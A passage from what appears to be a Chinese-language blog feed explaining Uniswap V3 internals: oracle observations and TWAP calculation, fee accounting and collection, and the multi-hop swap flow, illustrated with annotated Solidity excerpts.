beforeOrAt.tickCumulative) / observationTimeDelta) *<br>                targetDelta,<br>            beforeOrAt.secondsPerLiquidityCumulativeX128 +<br>                uint160(<br>                    (uint256(<br>                        atOrAfter.secondsPerLiquidityCumulativeX128 - beforeOrAt.secondsPerLiquidityCumulativeX128<br>                    ) * targetDelta) / observationTimeDelta<br>                )<br>        );<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在这函数中，会先调用 <code>getSurroundingObservations()</code> 找出的时间点前后，最近的两个 Oracle 数据。然后通过时间差的比较计算出需要返回的数据：</p><ul><li>如果和其中的某一个的时间戳相等，那么可以直接返回</li><li>如果在两个时间点的中间，那么通过计算增长率的方式，计算出请求时间点的 Oracle 数据并返回</li></ul><p><code>getSurroundingObservations()</code> 函数的作用是在已记录的 Oracle 数组中，找到时间戳离其最近的两个 Oracle 数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getSurroundingObservations(<br>    Observation[65535] storage self,<br>    uint32 time,<br>    uint32 target,<br>    int24 tick,<br>    uint16 index,<br>    uint128 liquidity,<br>    uint16 cardinality<br>) private view returns (Observation memory beforeOrAt, Observation memory atOrAfter) &#123;<br>    // optimistically set before to the newest observation<br>    // 先把 beforeOrAt 设置为当前最新数据<br>    beforeOrAt = self[index];<br><br>    // if the target is chronologically at or after the newest observation, we can early return<br>    // 检查 beforeOrAt 是否 &lt;= target<br>    if (lte(time, beforeOrAt.blockTimestamp, target)) &#123;<br>        if (beforeOrAt.blockTimestamp == target) &#123;<br>            // if newest observation equals target, we&#x27;re in the same block, so we can ignore atOrAfter<br>            // 如果时间戳相等，那么可以忽略 atOrAfter 直接返回<br>            return (beforeOrAt, atOrAfter);<br>        &#125; else &#123;<br>            // otherwise, we need to transform<br>            // 当前区块中发生代币对的交易之前请求此函数时可能会发生这种情况<br>        // 需要将当前还未持久化的数据，封装成一个 Oracle 数据返回，<br>            return (beforeOrAt, transform(beforeOrAt, target, tick, liquidity));<br>        &#125;<br>    &#125;<br><br>    // now, set before to the oldest observation<br>    // 将 beforeOrAt 调整至 Oracle 数组中最老的数据<br>// 即为当前 index 的下一个数据，或者 index 为 0 的数据<br>    beforeOrAt = self[(index + 1) % cardinality];<br>    if (!beforeOrAt.initialized) beforeOrAt = self[0];<br><br>    // ensure that the target is chronologically at or after the oldest observation<br>    require(lte(time, beforeOrAt.blockTimestamp, target), &#x27;OLD&#x27;);<br><br>    // if we&#x27;ve reached this point, we have to binary search<br>    // 然后通过二分查找的方式找到离目标时间点最近的前后两个 Oracle 数据<br>    return binarySearch(self, time, target, index, cardinality);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数会调用 <code>binarySearch()</code> 通过二分查找的方式，找到目标离目标时间点最近的前后两个 Oracle 数据，其中的具体实现这里就不再描述了。</p><p>最终，<code>UniswapV3Pool.observe()</code> 将会返回请求者所请求的每一个时间点的 Oracle 数据，请求者可以根据这些数据计算出交易对的 TWAP（时间加权平均价，几何平均数）</p><h4 id="TWAP-的计算"><a href="#TWAP-的计算" class="headerlink" title="TWAP 的计算"></a>TWAP 的计算</h4><p>假如我们想要获取最近 1 小时的 TWAP，在 <strong>observe</strong> 中传入了数组 [3600, 0]，可以得到这两个时间点的 tickCumulatives ，借此算出平均加权的 tick 。以 1 小时的时间间隔为例，计算平均加权的 tick 公式为：</p><ul><li><strong>averageTick = tickCumulative[1] - tickCumulative[0] / 3600</strong></li></ul><p>tickCumulative[1] 为当前时间的 tick 累计值，tickCumulative[0] 则为 1 小时前的 tick 累计值。</p><p>计算得到 averageTick 之后，还需要将其转换为价格，这时就需要使用另一个库 <strong>TickMath</strong> ：</p><ul><li><a href="https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/TickMath.sol">https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/TickMath.sol</a></li></ul><p>该库封装了 <strong>tick</strong> 和 <strong>sqrtPrice</strong> （根号价格）之间的转换函数，通过调用函数 <strong>getSqrtRatioAtTick</strong> 就可以将 <strong>averageTick</strong> 转换得到对应的 <strong>sqrtPriceX96</strong> 。</p><p>在 UniswapV3 中的价格，都是用 <strong>sqrtPriceX96</strong> 来表示的，其实是将根号价格扩展了 2 的 96 次方，即：</p><ul><li><strong>sqrtPriceX96 = sqrt(price) * 2^96</strong></li></ul><p>另外，需要注意的是，这里说的 price 其实是 token1Amount / token0Amount = token0Price，即 token0 的价格。为了方便理解，我们直接举例来说明。假设 token1 为 USDC，token0 为 WETH，那 token1 在合约里的精度数为 6，token0 的精度数则为 18，也即是说，1 USDC 在合约里表示为 1000000（1e6），而 1 WETH 则表示为 1e18。那么，如果 WETH/USDC 的十进制价格为 2000 的话，公式中的 price 就是指 2000 * 1e6 / 1e18 = 2000 / 1e12，该值其实是小于 1 的，在合约层面就无法表示，所以才需要对其扩展。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getSqrtTWAP(address uniswapV3Pool) external view returns (uint160 sqrtPriceX96) &#123;<br>  IUniswapV3Pool pool = IUniswapV3Pool(uniswapV3Pool);<br>  uint32[] memory secondsAgos = new uint32[](2);<br>  secondsAgos[0] = 3600;<br>  secondsAgos[1] = 0;<br>  (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);<br>  int56 averageTick = (tickCumulatives[1] - tickCumulatives[0]) / 3600;<br>  // tick(imprecise as it&#x27;s an integer) to price<br>  sqrtPriceX96 = TickMath.getSqrtRatioAtTick(averageTick);<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数用来获取指定 pool 在最近 1 小时内的时间加权平均价格，且表示为 sqrtPriceX96 的价格。</p><p>该函数要可行的话，主要有两个前提，一是该 pool 的 <strong>observations</strong> 已经有足够的扩容，二是扩容之后该池子已经交易了至少 1 小时。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;预言机的实现&quot;&gt;&lt;a href=&quot;#预言机的实现&quot; class=&quot;headerlink&quot; title=&quot;预言机的实现&quot;&gt;&lt;/a&gt;预言机的实现&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap Part Ⅳ | 交易手续费</title>
    <link href="http://example.com/2022/09/29/uniswap-v3-4/"/>
    <id>http://example.com/2022/09/29/uniswap-v3-4/</id>
    <published>2022-09-29T06:25:54.000Z</published>
    <updated>2022-09-29T06:27:00.549Z</updated>
    
    <content type="html"><![CDATA[<h1 id="交易手续费"><a href="#交易手续费" class="headerlink" title="交易手续费"></a>交易手续费</h1><h2 id="计算原理"><a href="#计算原理" class="headerlink" title="计算原理"></a>计算原理</h2><p>以普通用户的视角来看，对比 Uniswap v2，Uniswap v3 在手续费方面做了如下改动：</p><ul><li>添加流动性时，手续费可以有 3个级别供选择：0.05%, 0.3% 和 1%，未来可以通过治理加入更多可选的手续费率</li><li>Uniswap v2 中手续费会在收取后自动复投称为 LP 的一部分，即每次手续费都自动变成流动性加入池子中，而 Uniswap v3 中收取的手续费不会自动复投（主要是为了方便合约的计算），需要手动取出手续费</li><li>不同手续费级别，在添加流动性时，价格可选值的最小粒度也不一样（这个是因为 tick spacing 的影响），一般来说，手续费越低，价格可选值越精细，因此官方推荐价格波动小的交易对使用低费率（例如稳定币交易对）</li></ul><p>以开发者的视角来看，Uniswap v3 的手续费计算相对会比较复杂， 因为它需要针对每一个 <code>position</code> 来进行单独的计算，为了方便计算，在代码中会将手续费相关的元数据记录在 <code>position</code> 的边界 tick 上（这些 tick 上还存储了 ΔLΔL 等元数据）。</p><p> 当我们计算交易的手续费时，我们需要计算如下值：</p><ul><li>每一个 <code>position</code> 收取的手续费（token0, token1 需要分别单独计算）</li><li>用户如果提取了手续费，需要记录用户已提取的数值</li></ul><p>v3 中有以下几个关于手续费的变量：</p><ul><li>交易池中手续费的费率值，这里记录的值时以 1000000 为基数的值，例如当手续费为 0.03% 时，费率值为 300</li><li>全局状态变量 <code>feeGrowthGlobal0X128</code> 和 <code>feeGrowthGlobal1X128</code> ，分别表示 token0 和 token1 所累计的手续费总额，使用了 <code>Q128.128</code> 浮点数来记录</li><li>对于每个 tick，记录了 <code>feeGrowthOutside0X128</code> 和 <code>feeGrowthOutside1X128</code>，这两个变量记录了发生在此 tick 「外侧」的手续费总额，外侧指的是与当前价格所对应的 tick 相对于 tick i 的相反侧。</li><li>对于每个 <code>position</code>，记录了此 <code>position</code> 内的手续费总额 <code>feeGrowthInside0LastX128</code> 和 <code>feeGrowthInside1LastX128</code>，这个值不需要每次都更新，它只会在 <code>position</code> 发生变动，或者用户提取手续费时更新</li></ul><p>需要注意的时，上面这些手续费状态变量都是每一份 LP 所对应的手续费，在计算真正的手续费时，需要使用 LP 数相乘来得出实际手续费数额，又因为 LP 数在不同价格可能时不同的（因为流动性深度不同），所以在计算手续费时只能针对 <code>position</code> 进行计算（同一个 <code>position</code> 内 LP 总量不变）。</p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211502549.png" alt="image-20220925211502549"></p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211529269.png" alt="image-20220925211529269"></p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211548605.png" alt="image-20220925211548605"></p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211622048.png" alt="image-20220925211622048"></p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211636485.png" alt="image-20220925211636485"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>手续费更新的代码在前面有提到过</p><p>这里看一下手续费的提取</p><p>core中手续费的提取是以 <code>position</code> 为单位进行提取的。使用 <code>UniswapV3Pool.collect</code> 提取手续费：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function collect(<br>    address recipient,<br>    int24 tickLower,<br>    int24 tickUpper,<br>    uint128 amount0Requested,<br>    uint128 amount1Requested<br>) external override lock returns (uint128 amount0, uint128 amount1) &#123;<br>    // we don&#x27;t need to checkTicks here, because invalid positions will never have non-zero tokensOwed&#123;0,1&#125;<br>    // 获取 position 数据<br>    Position.Info storage position = positions.get(msg.sender, tickLower, tickUpper);<br><br>    // 根据参数调整需要提取的手续费<br>    amount0 = amount0Requested &gt; position.tokensOwed0 ? position.tokensOwed0 : amount0Requested;<br>    amount1 = amount1Requested &gt; position.tokensOwed1 ? position.tokensOwed1 : amount1Requested;<br><br>    // 将手续费发送给用户<br>    if (amount0 &gt; 0) &#123;<br>        position.tokensOwed0 -= amount0;<br>        TransferHelper.safeTransfer(token0, recipient, amount0);<br>    &#125;<br>    if (amount1 &gt; 0) &#123;<br>        position.tokensOwed1 -= amount1;<br>        TransferHelper.safeTransfer(token1, recipient, amount1);<br>    &#125;<br><br>    emit Collect(msg.sender, recipient, tickLower, tickUpper, amount0, amount1);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但是这里 <code>posiiton</code> 中的手续费可能并不是最新的（手续费总数只会在 <code>position</code> 的流动性更新时更新）。因此在提取手续费前，需要主动触发一次手续费的更新，这些操作已经在 <code>uniswap-v3-periphery</code> 仓库中进行了封装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function collect(CollectParams calldata params)<br>    external<br>    payable<br>    override<br>    isAuthorizedForToken(params.tokenId)<br>    returns (uint256 amount0, uint256 amount1)<br>&#123;<br>    require(params.amount0Max &gt; 0 || params.amount1Max &gt; 0);<br>    // allow collecting to the nft position manager address with address 0<br>    address recipient = params.recipient == address(0) ? address(this) : params.recipient;<br><br>    // 查询 position 信息<br>    Position storage position = _positions[params.tokenId];<br><br>    PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];<br><br>    IUniswapV3Pool pool = IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));<br><br>    (uint128 tokensOwed0, uint128 tokensOwed1) = (position.tokensOwed0, position.tokensOwed1);<br><br>    // trigger an update of the position fees owed and fee growth snapshots if it has any liquidity<br>    // 这里再次更新一次手续费累积总额<br>    if (position.liquidity &gt; 0) &#123;<br>        // 使用 pool.burn() 来触发手续费的更新<br>        pool.burn(position.tickLower, position.tickUpper, 0);<br>        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) =<br>            pool.positions(PositionKey.compute(address(this), position.tickLower, position.tickUpper));<br><br>        tokensOwed0 += uint128(<br>            FullMath.mulDiv(<br>                feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128,<br>                position.liquidity,<br>                FixedPoint128.Q128<br>            )<br>        );<br>        tokensOwed1 += uint128(<br>            FullMath.mulDiv(<br>                feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,<br>                position.liquidity,<br>                FixedPoint128.Q128<br>            )<br>        );<br><br>        position.feeGrowthInside0LastX128 = feeGrowthInside0LastX128;<br>        position.feeGrowthInside1LastX128 = feeGrowthInside1LastX128;<br>    &#125;<br><br>    // compute the arguments to give to the pool#collect method<br>    // 提取手续费的最大值，不能超过手续费总额<br>    (uint128 amount0Collect, uint128 amount1Collect) =<br>        (<br>            params.amount0Max &gt; tokensOwed0 ? tokensOwed0 : params.amount0Max,<br>            params.amount1Max &gt; tokensOwed1 ? tokensOwed1 : params.amount1Max<br>        );<br><br>    // the actual amounts collected are returned<br>    // 调用 pool.collect 将手续费发送给 recipient<br>    (amount0, amount1) = pool.collect(<br>        recipient,<br>        position.tickLower,<br>        position.tickUpper,<br>        amount0Collect,<br>        amount1Collect<br>    );<br><br>    // sometimes there will be a few less wei than expected due to rounding down in core, but we just subtract the full amount expected<br>    // instead of the actual amount so we can burn the token<br>    (position.tokensOwed0, position.tokensOwed1) = (tokensOwed0 - amount0Collect, tokensOwed1 - amount1Collect);<br><br>    emit Collect(params.tokenId, recipient, amount0Collect, amount1Collect);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个函数就是先用 <code>pool.burn</code> 函数来触发 pool 中 <code>position</code> 内手续费总额的更新，使其更新为当前的最新值。调用时传入参数的 Liquidity 为 0，表示只是用来触发手续费总额的更新，并没有进行流动性的更新。更新完成后，再调用 <code>pool.collect</code> 提取手续费。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;交易手续费&quot;&gt;&lt;a href=&quot;#交易手续费&quot; class=&quot;headerlink&quot; title=&quot;交易手续费&quot;&gt;&lt;/a&gt;交易手续费&lt;/h1&gt;&lt;h2 id=&quot;计算原理&quot;&gt;&lt;a href=&quot;#计算原理&quot; class=&quot;headerlink&quot; title=&quot;计算原理&quot;</summary>
      
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap Part Ⅲ | 交易过程</title>
    <link href="http://example.com/2022/09/29/uniswap-v3-3/"/>
    <id>http://example.com/2022/09/29/uniswap-v3-3/</id>
    <published>2022-09-29T06:22:45.000Z</published>
    <updated>2022-09-29T06:25:40.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="交易过程"><a href="#交易过程" class="headerlink" title="交易过程"></a>交易过程</h1><p> <code>SwapRouter</code> 合约中封装了面向用户的交易接口：</p><ul><li><code>exactInput</code>：指定交易对路径，付出的 x token 数和预期得到的最小 y token 数（x, y 可以互换）</li><li><code>exactOutput</code>：指定交易路径，付出的 x token 最大数和预期得到的 y token 数（x, y 可以互换）</li></ul><p>关于 <code>exactInput</code> 这个接口，调用流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sequence">User-&gt;SwapRouter:exactInput<br>SwapRouter-&gt;SwapRouter:exactInputInternal<br>SwapRouter-&gt;UniswapV3Pool:swap<br>UniswapV3Pool-&gt;UniswapV3Pool:computeSwapStep<br></code></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="/2022/09/29/uniswap-v3-3/image-20220819175714261.png" alt="image-20220819175714261"></p><p>在V2中，流动性是均匀分布的，而V3中因为一个交易池中会有多个不同深度的流动池（每一个可以单独设置交易价格区间），因此一次交易的过程可能跨越多个不同的深度</p><p><img src="/2022/09/29/uniswap-v3-3/image-20220819175735791.png" alt="image-20220819175735791"></p><p>以上是真实情况中的流动性分布</p><p>现在假设价格处于一个持续上涨的趋势，当价格开始从左至右穿过这些价格区间时，会不断用一种资产换取另一种资产，而被换出的资产储备是不断减小的，一旦当前价格区间的某种资产被耗尽，价格会穿过当前区间，进入下一个区间，由此产生了价格的变化（因为价格右移了，变大了）。在价格移动消耗池内资产数量的过程中，输入的资产数量也会不断减少，一旦在某个区间输入资产被耗尽，那么价格就会停留在该区间内。</p><p>当然只是让价格停留在区间内，是不精确的，这个时候我们就需要借助计算添加流动性推导出来的公式，去反推计算出一个精确的价格（在该价格区间内）。</p><h2 id="exactInput"><a href="#exactInput" class="headerlink" title="exactInput"></a>exactInput</h2><p>exactInput函数在合约SwapRouter中，其中struct ExactInputParams写在接口ISwapRouter中</p><p>这里使用一个循环遍历传入的路径，路径中包含了交易过程中所有的 token，每相邻的两个 token 组成了一个交易对。例如当需要通过 <code>ETH</code> -&gt; <code>USDC</code> -&gt; <code>DAI</code> 路径进行交易时，会经过两个池：<code>ETH/USDC</code> 和 <code>USDC/DAI</code>，最终得到 <code>DAI</code> 代币。如前所述，这里其实还包含了每个交易对所选择的费率。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct ExactInputParams &#123;<br>    bytes path; //路径<br>    address recipient; //收款地址<br>    uint256 deadline; //交易有效期<br>    uint256 amountIn; //输入的 token 数（输入的 token 地址就是 path 中的第一个地址）<br>    uint256 amountOutMinimum; //预期交易最少获得的 token 数（获得的 token 地址就是 path 中最后一个地址）<br>&#125;<br><br>function exactInput(ExactInputParams memory params)<br>    external<br>    payable<br>    override<br>    checkDeadline(params.deadline)<br>    returns (uint256 amountOut)<br>&#123;<br>    address payer = msg.sender; // msg.sender pays for the first hop<br><br>    //遍历传入的路径，进行交易<br>    while (true) &#123;<br>        bool hasMultiplePools = params.path.hasMultiplePools();<br><br>        // the outputs of prior swaps become the inputs to subsequent ones<br>        //完成当前路径的交易<br>        params.amountIn = exactInputInternal(<br>            params.amountIn,<br>            //如果是中间交易，本合约代为收取和支付中间代币<br>            //这里会判断是否是最后一次交易，当是最后一次交易时，获取的 token 的地址才是用户的指定的地址<br>            hasMultiplePools ? address(this) : params.recipient, // for intermediate swaps, this contract custodies<br>            0,<br>            //回调函数<br>            SwapCallbackData(&#123;<br>                path: params.path.getFirstPool(), // only the first pool in the path is necessary<br>                payer: payer<br>            &#125;)<br>        );<br><br>        // decide whether to continue or terminate<br>        //如果路径全部遍历完成，则退出循环，交易完成<br>        if (hasMultiplePools) &#123;<br>            payer = address(this); // at this point, the caller has paid<br>            params.path = params.path.skipToken();<br>        &#125; else &#123;<br>            amountOut = params.amountIn;<br>            break;<br>        &#125;<br>    &#125;<br><br>    //检查交易是否满足预期<br>    //如果交易的获得 token 数满足约束，则本次交易结束。<br>    require(amountOut &gt;= params.amountOutMinimum, &#x27;Too little received&#x27;);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h3><p>上面输入的参数中 <code>path</code> 字段是 <code>bytes</code> 类型，通过这种类型可以实现更紧凑的编码。Uniswap 会将 <code>bytes</code> 作为一个数组使用，<code>bytes</code> 类型就是一连串的 <code>byte1</code>，但是不会对每一个成员使用一个 word，因此相比普通数组其结构更加紧凑。在 Uniswap V3 中， path 内部编码结构如下图：</p><img src="/2022/09/29/uniswap-v3-3/image-20220819175811545.png" alt="image-20220819175811545" style="zoom:80%;"><p>图中展示了一个包含 2个路径（pool0, 和 pool1）的 path 编码。Uniswap 将编码解码操作封装在了 <code>Path</code> 库中，本文不再赘述其过程。每次交易时，会取出头部的 <code>tokenIn</code>, <code>tokenOut</code>, <code>fee</code>，使用这三个参数找到对应的交易池，完成交易。</p><h2 id="exactInputInternal"><a href="#exactInputInternal" class="headerlink" title="exactInputInternal"></a>exactInputInternal</h2><p>单个池的交易</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function exactInputInternal(<br>    uint256 amountIn,<br>    address recipient,<br>    uint160 sqrtPriceLimitX96,<br>    SwapCallbackData memory data<br>) private returns (uint256 amountOut) &#123;<br>    // allow swapping to the router address with address 0<br>    //如果收款地址为0，则默认收款地址为本合约地址<br>    if (recipient == address(0)) recipient = address(this);<br><br>    //将 path 解码，获取头部的 tokenIn, tokenOut, fee<br>    (address tokenIn, address tokenOut, uint24 fee) = data.path.decodeFirstPool();<br><br>    //因为交易池只保存了 token x 的价格，这里我们需要知道输入的 token 是交易池 x token 还是 y token<br>    //token0/token为true，token1/token0为false<br>    bool zeroForOne = tokenIn &lt; tokenOut;<br><br>    //交易<br>    (int256 amount0, int256 amount1) =<br>        getPool(tokenIn, tokenOut, fee).swap(<br>            recipient,<br>            zeroForOne,<br>            amountIn.toInt256(),<br>            sqrtPriceLimitX96 == 0<br>                ? (zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)<br>                : sqrtPriceLimitX96,<br>            abi.encode(data)<br>        );<br><br>    return uint256(-(zeroForOne ? amount1 : amount0));<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h2><p><img src="/2022/09/29/uniswap-v3-3/image-20220821114016119.png" alt="image-20220821114016119"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 